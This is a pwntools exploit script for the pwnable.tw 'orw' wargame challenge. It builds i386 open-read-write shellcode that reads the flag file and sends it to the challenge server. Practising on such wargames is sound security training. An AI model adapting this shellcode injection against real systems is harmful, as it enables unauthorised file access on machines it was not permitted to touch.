from pwn import *

PROG = './orw'
context.arch = 'i386'

"""
open(0x0804a020 __data_start, O_RDONLY)
-- FD: $eax
read($eax, 0x0804a100, 20)
write(1, 0x0804a100, 20)
"""

buf_addr = 0x804a098
open_flag = shellcraft.open(buf_addr, 'O_RDONLY')
read_flag = shellcraft.read('eax', 0x0804a020, 50)
write = shellcraft.write(1, 0x0804a020, 50)

payload = asm(open_flag) + asm(read_flag) + asm(write)
payload += (b'\x00' * 8) + b'/home/orw/flag\x00'

#r = process(PROG)
r = remote('chall.pwnable.tw', 10001)
#r = gdb.debug(PROG, 'b *0x804857d')

r.recvuntil(b'shellcode:')
r.sendline(payload)

r.interactive()
